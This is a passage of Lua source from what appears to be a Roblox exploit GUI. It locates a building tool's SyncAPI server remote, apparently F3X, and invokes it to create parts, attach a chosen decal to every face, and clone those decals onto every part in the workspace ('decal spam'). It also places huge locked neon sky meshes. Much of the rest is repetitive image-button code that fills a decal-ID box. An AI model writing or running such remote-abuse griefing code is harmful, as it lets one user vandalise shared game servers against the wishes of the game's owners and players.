	MeshResize(v, Vector3.new(spec.scale, spec.scale, spec.scale))

	SetLocked(v, true)
	SetTrans(v, spec.transparency)

	_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

	Color(v, Color3.fromRGB(255, 255, 255))

	_({ "CreateLights", { { Part = v, LightType = "PointLight" } } })

	SyncLighting(v, 0)
end

function UpdateSkies()
	for i, v in game.Workspace:GetDescendants() do
		if isSky(v) then
			local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
			if specialMesh then
				local vColor = specialMesh.VertexColor
				if vColor == ZERO then
					continue
				end

				local currentScale = specialMesh.Scale
				local currentTexture = specialMesh.TextureId:match("%d+") or ""
				local currentMeshId = specialMesh.MeshId:match("%d+") or SKY_MESH

				local targetVertexColor
				local targetTransparency

				if currentScale.X >= 105000 then
					targetVertexColor = ZERO
					targetTransparency = 0
				elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
					targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
					targetTransparency = 0.02
				else
					targetVertexColor = vColor
					targetTransparency = v.Transparency
				end

				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(v, currentTexture, targetVertexColor)
				else
					SetMesh(v, currentMeshId, targetVertexColor)
				end

				SetLocked(v, true)
				SetTrans(v, targetTransparency)

				_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

				Color(v, Color3.fromRGB(255, 255, 255))
				SyncLighting(v, 0)
			end
		end
	end
end

local big, small = findExisting()

if not small then
	UpdateSkies()
	big, small = findExisting()
end

if small then
	UpdateMeshTextureAndColor(small, SMALL_ID, nil)
end

local specs = {}
if not big then
	table.insert(specs, { id = "dont change this", transparency = 0, scale = 110000, vertexColor = ZERO, offset = Vector3.new(-25, -10, 0) })
end
if not small then
	table.insert(specs, { id = SMALL_ID, transparency = 0.02, scale = 99999, vertexColor = Vector3.new(4, 4, 4), offset = Vector3.new(25, -10, 0) })
end

if #specs > 0 then
	local hrp = char.HumanoidRootPart.CFrame
	local basePos = Vector3.new(math.floor(hrp.X), math.floor(hrp.Y), math.floor(hrp.Z))

	for _, spec in ipairs(specs) do
		spec.pos = basePos + spec.offset
		task.spawn(CreatePart, CFrame.new(spec.pos) + Vector3.new(0, -10, 0), workspace)
	end

	for _, spec in ipairs(specs) do
		task.spawn(function()
			local part = waitForPartAt(spec.pos.X, spec.pos.Z)
			if part then
				setupSky(part, spec)
			end
		end)
	end
end

end)
end

local skyid = Instance.new("TextBox")
skyid.Name = "skyid"
skyid.ClearTextOnFocus = false
skyid.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
skyid.PlaceholderColor3 = Color3.fromRGB(132, 132, 132)
skyid.PlaceholderText = "-- decal id --"
skyid.Text = ""
skyid.TextColor3 = Color3.fromRGB(255, 255, 255)
skyid.TextScaled = true
skyid.TextSize = 14
skyid.TextWrapped = true
skyid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
skyid.BorderColor3 = Color3.fromRGB(0, 242, 255)
skyid.Position = UDim2.new(1.6471827, 0, 0.797493875, 0)
skyid.Size = UDim2.new(0, 108, 0, 21)
skyid.Parent = Frame

local decalinsert = Instance.new("TextButton")
decalinsert.Name = "decalinsert"
decalinsert.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
decalinsert.Text = "decal spam"
decalinsert.TextColor3 = Color3.fromRGB(255, 255, 255)
decalinsert.TextScaled = true
decalinsert.TextSize = 22
decalinsert.TextWrapped = true
decalinsert.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
decalinsert.BorderColor3 = Color3.fromRGB(0, 242, 255)
decalinsert.Position = UDim2.new(0.351408005, 0, -0.608939886, 0)
decalinsert.Size = UDim2.new(0, 75, 0, 47)
decalinsert.Parent = Frame

local LocalScript14 = Instance.new("Folder")
LocalScript14.Name = "LocalScript"
LocalScript14.Parent = decalinsert
__S[#__S + 1] = function(...)
local script = LocalScript14
script.Parent.MouseButton1Click:Connect(function()
local id = script.Parent.Parent:FindFirstChild("skyid") and script.Parent.Parent.skyid.Text or "" 

local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
		tool = v.Parent
	end
end
if tool == nil then
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
end
local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    return remote:InvokeServer(unpack(args))
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function SpawnDecal(part,side)
	local args = {
		[1] = "CreateTextures",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal"
			}
		}
	}

	_(args)
end
function AddDecal(part,asset,side)
	local args = {
		[1] = "SyncTexture",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal",
				["Texture"] = "rbxassetid://".. asset
			}
		}
	}
	_(args)
end
function ClonePart(table,parent)
	 local args = {
	   [1] ="Clone",
	   [2] = table,
	   [3] = parent
	}

	_(args)
end

local testpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(102938,182939,2928458), workspace.Terrain)
local root = testpart 
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Front)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Front)
  end)
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Back)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Back)
  end)
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Right)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Right)
  end)
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Left)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Left)
  end)
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Bottom)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Bottom)
  end)
task.defer(function()
	SpawnDecal(root,Enum.NormalId.Top)
  end)
task.defer(function()
	AddDecal(root,id,Enum.NormalId.Top)
	  end)
repeat task.wait() until root:FindFirstChildOfClass("Decal")
local decals = {}
for i,v in root: GetDescendants()do
if v:IsA"Decal"then 
table.insert(decals,v)
end
end
function exPro(root)
task.spawn(ClonePart,decals,root)
end

function asdf()
	for i,v in game.workspace:GetDescendants() do
		if v:IsA("BasePart") and v.Name ~= "Sky" then
	  task.defer(exPro,v)
		end
	end 
end
asdf()

end)
end

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.XY
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(-0.0254016556, 0, 1.85012531, 0)
ScrollingFrame.Size = UDim2.new(0, 543, 0, 141)
R[42] = ScrollingFrame
ScrollingFrame.Parent = Frame

local ImageButton = Instance.new("ImageButton")
ImageButton.Name = "ImageButton"
ImageButton.Image = "rbxassetid://7203369576"
ImageButton.ImageContent = Content.fromUri("rbxassetid://7203369576")
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1
ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Size = UDim2.new(0, 73, 0, 62)
ImageButton.Parent = ScrollingFrame

local LocalScript15 = Instance.new("Folder")
LocalScript15.Name = "LocalScript"
LocalScript15.Parent = ImageButton
__S[#__S + 1] = function(...)
local script = LocalScript15
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton2 = Instance.new("ImageButton")
ImageButton2.Name = "ImageButton"
ImageButton2.Image = "rbxassetid://118663974620118"
ImageButton2.ImageContent = Content.fromUri("rbxassetid://118663974620118")
ImageButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton2.BackgroundTransparency = 1
ImageButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton2.BorderSizePixel = 0
ImageButton2.Size = UDim2.new(0, 73, 0, 62)
ImageButton2.Parent = ScrollingFrame

local LocalScript16 = Instance.new("Folder")
LocalScript16.Name = "LocalScript"
LocalScript16.Parent = ImageButton2
__S[#__S + 1] = function(...)
local script = LocalScript16
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton3 = Instance.new("ImageButton")
ImageButton3.Name = "ImageButton"
ImageButton3.Image = "rbxassetid://92049037128764"
ImageButton3.ImageContent = Content.fromUri("rbxassetid://92049037128764")
ImageButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton3.BackgroundTransparency = 1
ImageButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton3.BorderSizePixel = 0
ImageButton3.Size = UDim2.new(0, 73, 0, 62)
ImageButton3.Parent = ScrollingFrame

local LocalScript17 = Instance.new("Folder")
LocalScript17.Name = "LocalScript"
LocalScript17.Parent = ImageButton3
__S[#__S + 1] = function(...)
local script = LocalScript17
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton4 = Instance.new("ImageButton")
ImageButton4.Name = "ImageButton"
ImageButton4.Image = "rbxassetid://126352673544390"
ImageButton4.ImageContent = Content.fromUri("rbxassetid://126352673544390")
ImageButton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton4.BackgroundTransparency = 1
ImageButton4.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton4.BorderSizePixel = 0
ImageButton4.Size = UDim2.new(0, 73, 0, 62)
ImageButton4.Parent = ScrollingFrame

local LocalScript18 = Instance.new("Folder")
LocalScript18.Name = "LocalScript"
LocalScript18.Parent = ImageButton4
__S[#__S + 1] = function(...)
local script = LocalScript18
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton5 = Instance.new("ImageButton")
ImageButton5.Name = "ImageButton"
ImageButton5.Image = "rbxassetid://78439593987132"
ImageButton5.ImageContent = Content.fromUri("rbxassetid://78439593987132")
ImageButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton5.BackgroundTransparency = 1
ImageButton5.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton5.BorderSizePixel = 0
ImageButton5.Size = UDim2.new(0, 73, 0, 62)
ImageButton5.Parent = ScrollingFrame

local LocalScript19 = Instance.new("Folder")
LocalScript19.Name = "LocalScript"
LocalScript19.Parent = ImageButton5
__S[#__S + 1] = function(...)
local script = LocalScript19
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton6 = Instance.new("ImageButton")
ImageButton6.Name = "ImageButton"
ImageButton6.Image = "rbxassetid://110540576072325"
ImageButton6.ImageContent = Content.fromUri("rbxassetid://110540576072325")
ImageButton6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton6.BackgroundTransparency = 1
ImageButton6.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton6.BorderSizePixel = 0
ImageButton6.Size = UDim2.new(0, 73, 0, 62)
ImageButton6.Parent = ScrollingFrame

local LocalScript20 = Instance.new("Folder")
LocalScript20.Name = "LocalScript"
LocalScript20.Parent = ImageButton6
__S[#__S + 1] = function(...)
local script = LocalScript20
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton7 = Instance.new("ImageButton")
ImageButton7.Name = "ImageButton"
ImageButton7.Image = "rbxassetid://134321703091177"
ImageButton7.ImageContent = Content.fromUri("rbxassetid://134321703091177")
ImageButton7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton7.BackgroundTransparency = 1
ImageButton7.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton7.BorderSizePixel = 0
ImageButton7.Size = UDim2.new(0, 73, 0, 62)
ImageButton7.Parent = ScrollingFrame

local LocalScript21 = Instance.new("Folder")
LocalScript21.Name = "LocalScript"
LocalScript21.Parent = ImageButton7
__S[#__S + 1] = function(...)
local script = LocalScript21
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton8 = Instance.new("ImageButton")
ImageButton8.Name = "ImageButton"
ImageButton8.Image = "rbxassetid://130809846005728"
ImageButton8.ImageContent = Content.fromUri("rbxassetid://130809846005728")
ImageButton8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton8.BackgroundTransparency = 1
ImageButton8.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton8.BorderSizePixel = 0
ImageButton8.Size = UDim2.new(0, 73, 0, 62)
ImageButton8.Parent = ScrollingFrame

local LocalScript22 = Instance.new("Folder")
LocalScript22.Name = "LocalScript"
LocalScript22.Parent = ImageButton8
__S[#__S + 1] = function(...)
local script = LocalScript22
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton9 = Instance.new("ImageButton")
ImageButton9.Name = "ImageButton"
ImageButton9.Image = "rbxassetid://99015760365756"
ImageButton9.ImageContent = Content.fromUri("rbxassetid://99015760365756")
ImageButton9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton9.BackgroundTransparency = 1
ImageButton9.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton9.BorderSizePixel = 0
ImageButton9.Size = UDim2.new(0, 73, 0, 62)
ImageButton9.Parent = ScrollingFrame

local LocalScript23 = Instance.new("Folder")
LocalScript23.Name = "LocalScript"
LocalScript23.Parent = ImageButton9
__S[#__S + 1] = function(...)
local script = LocalScript23
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton10 = Instance.new("ImageButton")
ImageButton10.Name = "ImageButton"
ImageButton10.Image = "rbxassetid://158118263"
ImageButton10.ImageContent = Content.fromUri("rbxassetid://158118263")
ImageButton10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton10.BackgroundTransparency = 1
ImageButton10.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton10.BorderSizePixel = 0
ImageButton10.Size = UDim2.new(0, 73, 0, 62)
ImageButton10.Parent = ScrollingFrame

local LocalScript24 = Instance.new("Folder")
LocalScript24.Name = "LocalScript"
LocalScript24.Parent = ImageButton10
__S[#__S + 1] = function(...)
local script = LocalScript24
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton11 = Instance.new("ImageButton")
ImageButton11.Name = "ImageButton"
ImageButton11.Image = "rbxassetid://87885282504265"
ImageButton11.ImageContent = Content.fromUri("rbxassetid://87885282504265")
ImageButton11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton11.BackgroundTransparency = 1
ImageButton11.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton11.BorderSizePixel = 0
ImageButton11.Size = UDim2.new(0, 73, 0, 62)
ImageButton11.Parent = ScrollingFrame

local LocalScript25 = Instance.new("Folder")
LocalScript25.Name = "LocalScript"
LocalScript25.Parent = ImageButton11
__S[#__S + 1] = function(...)
local script = LocalScript25
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton12 = Instance.new("ImageButton")
ImageButton12.Name = "ImageButton"
ImageButton12.Image = "rbxassetid://3342499434"
ImageButton12.ImageContent = Content.fromUri("rbxassetid://3342499434")
ImageButton12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton12.BackgroundTransparency = 1
ImageButton12.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton12.BorderSizePixel = 0
ImageButton12.Size = UDim2.new(0, 73, 0, 62)
ImageButton12.Parent = ScrollingFrame

local LocalScript26 = Instance.new("Folder")
LocalScript26.Name = "LocalScript"
LocalScript26.Parent = ImageButton12
__S[#__S + 1] = function(...)
local script = LocalScript26
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton13 = Instance.new("ImageButton")
ImageButton13.Name = "ImageButton"
ImageButton13.Image = "rbxassetid://13579585726"
ImageButton13.ImageContent = Content.fromUri("rbxassetid://13579585726")
ImageButton13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton13.BackgroundTransparency = 1
ImageButton13.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton13.BorderSizePixel = 0
ImageButton13.Size = UDim2.new(0, 73, 0, 62)
ImageButton13.Parent = ScrollingFrame

local LocalScript27 = Instance.new("Folder")
LocalScript27.Name = "LocalScript"
LocalScript27.Parent = ImageButton13
__S[#__S + 1] = function(...)
local script = LocalScript27
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton14 = Instance.new("ImageButton")
ImageButton14.Name = "ImageButton"
ImageButton14.Image = "rbxassetid://128091284838606"
ImageButton14.ImageContent = Content.fromUri("rbxassetid://128091284838606")
ImageButton14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton14.BackgroundTransparency = 1
ImageButton14.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton14.BorderSizePixel = 0
ImageButton14.Size = UDim2.new(0, 73, 0, 62)
ImageButton14.Parent = ScrollingFrame

local LocalScript28 = Instance.new("Folder")
LocalScript28.Name = "LocalScript"
LocalScript28.Parent = ImageButton14
__S[#__S + 1] = function(...)
local script = LocalScript28
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton15 = Instance.new("ImageButton")
ImageButton15.Name = "ImageButton"
ImageButton15.Image = "rbxassetid://129593475490308"
ImageButton15.ImageContent = Content.fromUri("rbxassetid://129593475490308")
ImageButton15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton15.BackgroundTransparency = 1
ImageButton15.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton15.BorderSizePixel = 0
ImageButton15.Size = UDim2.new(0, 73, 0, 62)
ImageButton15.Parent = ScrollingFrame

local LocalScript29 = Instance.new("Folder")
LocalScript29.Name = "LocalScript"
LocalScript29.Parent = ImageButton15
__S[#__S + 1] = function(...)
local script = LocalScript29
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton16 = Instance.new("ImageButton")
ImageButton16.Name = "ImageButton"
ImageButton16.Image = "rbxassetid://109129888"
ImageButton16.ImageContent = Content.fromUri("rbxassetid://109129888")
ImageButton16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton16.BackgroundTransparency = 1
ImageButton16.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton16.BorderSizePixel = 0
ImageButton16.Size = UDim2.new(0, 73, 0, 62)
ImageButton16.Parent = ScrollingFrame

local LocalScript30 = Instance.new("Folder")
LocalScript30.Name = "LocalScript"
LocalScript30.Parent = ImageButton16
__S[#__S + 1] = function(...)
local script = LocalScript30
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton17 = Instance.new("ImageButton")
ImageButton17.Name = "ImageButton"
ImageButton17.Image = "rbxassetid://111944859652944"
ImageButton17.ImageContent = Content.fromUri("rbxassetid://111944859652944")
ImageButton17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton17.BackgroundTransparency = 1
ImageButton17.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton17.BorderSizePixel = 0
ImageButton17.Size = UDim2.new(0, 73, 0, 62)
ImageButton17.Parent = ScrollingFrame

local LocalScript31 = Instance.new("Folder")
LocalScript31.Name = "LocalScript"
LocalScript31.Parent = ImageButton17
__S[#__S + 1] = function(...)
local script = LocalScript31
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton18 = Instance.new("ImageButton")
ImageButton18.Name = "ImageButton"
ImageButton18.Image = "rbxassetid://6737559631"
ImageButton18.ImageContent = Content.fromUri("rbxassetid://6737559631")
ImageButton18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton18.BackgroundTransparency = 1
ImageButton18.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton18.BorderSizePixel = 0
ImageButton18.Size = UDim2.new(0, 73, 0, 62)
ImageButton18.Parent = ScrollingFrame

local LocalScript32 = Instance.new("Folder")
LocalScript32.Name = "LocalScript"
LocalScript32.Parent = ImageButton18
__S[#__S + 1] = function(...)
local script = LocalScript32
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton19 = Instance.new("ImageButton")
ImageButton19.Name = "ImageButton"
ImageButton19.Image = "rbxassetid://121436641180134"
ImageButton19.ImageContent = Content.fromUri("rbxassetid://121436641180134")
ImageButton19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton19.BackgroundTransparency = 1
ImageButton19.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton19.BorderSizePixel = 0
ImageButton19.Size = UDim2.new(0, 73, 0, 62)
ImageButton19.Parent = ScrollingFrame

local LocalScript33 = Instance.new("Folder")
LocalScript33.Name = "LocalScript"
LocalScript33.Parent = ImageButton19
__S[#__S + 1] = function(...)
local script = LocalScript33
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton20 = Instance.new("ImageButton")
ImageButton20.Name = "ImageButton"
ImageButton20.Image = "rbxassetid://102429004626906"
ImageButton20.ImageContent = Content.fromUri("rbxassetid://102429004626906")
ImageButton20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton20.BackgroundTransparency = 1
ImageButton20.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton20.BorderSizePixel = 0
ImageButton20.Size = UDim2.new(0, 73, 0, 62)
ImageButton20.Parent = ScrollingFrame

local LocalScript34 = Instance.new("Folder")
LocalScript34.Name = "LocalScript"
LocalScript34.Parent = ImageButton20
__S[#__S + 1] = function(...)
local script = LocalScript34
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton21 = Instance.new("ImageButton")
ImageButton21.Name = "ImageButton"
ImageButton21.Image = "rbxassetid://134725798172366"
ImageButton21.ImageContent = Content.fromUri("rbxassetid://134725798172366")
ImageButton21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton21.BackgroundTransparency = 1
ImageButton21.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton21.BorderSizePixel = 0
ImageButton21.Size = UDim2.new(0, 73, 0, 62)
ImageButton21.Parent = ScrollingFrame

local LocalScript35 = Instance.new("Folder")
LocalScript35.Name = "LocalScript"
LocalScript35.Parent = ImageButton21
__S[#__S + 1] = function(...)
local script = LocalScript35
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton22 = Instance.new("ImageButton")
ImageButton22.Name = "ImageButton"
ImageButton22.Image = "rbxassetid://127178555059104"
ImageButton22.ImageContent = Content.fromUri("rbxassetid://127178555059104")
ImageButton22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton22.BackgroundTransparency = 1
ImageButton22.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton22.BorderSizePixel = 0
ImageButton22.Size = UDim2.new(0, 73, 0, 62)
ImageButton22.Parent = ScrollingFrame

local LocalScript36 = Instance.new("Folder")
LocalScript36.Name = "LocalScript"
LocalScript36.Parent = ImageButton22
__S[#__S + 1] = function(...)
local script = LocalScript36
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton23 = Instance.new("ImageButton")
ImageButton23.Name = "ImageButton"
ImageButton23.Image = "rbxassetid://89523656953676"
ImageButton23.ImageContent = Content.fromUri("rbxassetid://89523656953676")
ImageButton23.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton23.BackgroundTransparency = 1
ImageButton23.BorderColor3 = Color3.fromRGB(0, 0, 0)
